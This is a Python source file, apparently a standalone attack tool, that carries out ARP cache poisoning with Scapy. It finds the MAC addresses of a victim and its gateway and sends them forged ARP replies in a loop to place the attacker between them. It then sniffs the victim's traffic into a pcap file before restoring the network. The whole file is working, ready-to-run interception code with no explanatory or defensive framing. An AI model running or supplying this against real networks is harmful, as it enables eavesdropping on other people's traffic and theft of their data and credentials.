import argparse
import netifaces
from scapy.all import *
import sys
import threading

quiet = False
stop_threads = False


def print_message(message: str):
    """
    Print message to STDOUT if the quiet option is set to False (this is the default).
    :param message: message to print
    :return: None
    """
    global quiet
    if not quiet:
        print(message)


def do_poison(target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str, my_mac: str):
    """
    Start poisoning the ARP cache on the network.
    :param target_ip: victim IP address
    :param target_mac: victim MAC address
    :param gateway_ip: gateway IP address
    :param gateway_mac: gateway MAC address
    :param my_mac: attacker MAC address
    :return: None
    """
    # craft ARP reply to convince victim machine that we are the gateway
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwsrc = my_mac
    poison_target.hwdst = target_mac

    # craft ARP reply to convince gateway that we are the target IP
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwsrc = my_mac
    poison_gateway.hwdst = gateway_mac

    print("Starting ARP poisoning. Hit CTRL-C to stop.")
    while True:
        try:
            global stop_threads
            if stop_threads:
                break
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            break
    reset_network(target_ip, target_mac, gateway_ip, gateway_mac)
    print('ARP poison attack finished.')
    return


def reset_network(target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str):
    """
    Reset the network back to the normal state before poisoning occurred.
    :param target_ip: victim IP address
    :param target_mac: victim MAC address
    :param gateway_ip: gateway IP address
    :param gateway_mac: gateway MAC address
    :return: None
    """
    print_message('Resetting network to previous state.')
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)


def get_mac_address_by_arp(ip_address: str):
    """
    Obtain the MAC address associated with the specified IP address.
    :param ip_address: target IP address
    :return: MAC address of target IP
    """
    # send ARP requests to gather MAC address of provided IP address
    responses, unanswered = arping(ip_address)
    # if responses are received, return the MAC address from the first response
    for s, r in responses:
        return r[Ether].src
    return None


def get_mac_address_by_interface(interface_name: str):
    """
    Obtain the MAC address belonging to the local interface specified.
    :param interface_name: name of interface to get the MAC address for
    :return: MAC address of specified interface
    """
    return netifaces.ifaddresses(interface_name)[netifaces.AF_LINK][0]['addr']


def main():
    global quiet
    global stop_threads

    parser = argparse.ArgumentParser(description='ARP cache poisoner')
    parser.add_argument('-i', '--iface', required=True, help='Network interface to use')
    parser.add_argument('target_ip', help='Target (victim) IP address')
    parser.add_argument('-g', '--gateway', required=True, help='Default gateway of target subnet')
    parser.add_argument('-c', '--count', required=False, default=0,
                        help='Number of packets to listen for (default is 0 for unlimited)')
    parser.add_argument('-o', '--output', required=True, help='Output file to write captured packets to')
    parser.add_argument('-q', '--quiet', help='Do not print informative messages', action='store_true')
    args = parser.parse_args()

    interface = args.iface
    target_ip = args.target_ip
    gateway_ip = args.gateway
    packet_count = int(args.count)
    output_file = args.output
    quiet = args.quiet

    print_message('Setting up {} interface.'.format(interface))
    my_mac = get_mac_address_by_interface(interface)
    print_message('Obtaining MAC address for gateway IP {}.'.format(gateway_ip))
    gateway_mac = get_mac_address_by_arp(gateway_ip)
    if not gateway_mac:
        print('FATAL ERROR, unable to obtain default gateway MAC address.')
        sys.exit(100)
    print_message('Obtaining MAC address for target IP {}.'.format(target_ip))
    target_mac = get_mac_address_by_arp(target_ip)
    if not target_mac:
        print('FATAL ERROR, unable to obtain MAC address for target IP.')
        sys.exit(101)

    print_message('Gateway MAC: {}, Target MAC: {}'.format(gateway_mac, target_mac))

    print_message('Launching ARP poison thread.')
    poison_thread = threading.Thread(target=do_poison, args=(target_ip, target_mac, gateway_ip, gateway_mac, my_mac))
    poison_thread.start()

    print_message('Starting to listen for hijacked packets.')
    packets = None
    try:
        filter = 'ip host {}'.format(target_ip)
        kwargs = {'filter': filter, 'iface': interface}
        if packet_count > 0:
            kwargs['count'] = packet_count
        packets = sniff(**kwargs)
    except KeyboardInterrupt:
        pass

    print_message('Finished capturing packets. Stopping poison thread and resetting network..')
    stop_threads = True
    poison_thread.join()

    print_message('Writing captured packets to file {}.'.format(output_file))
    if packets:
        wrpcap(output_file, packets)


if __name__ == '__main__':
    main()
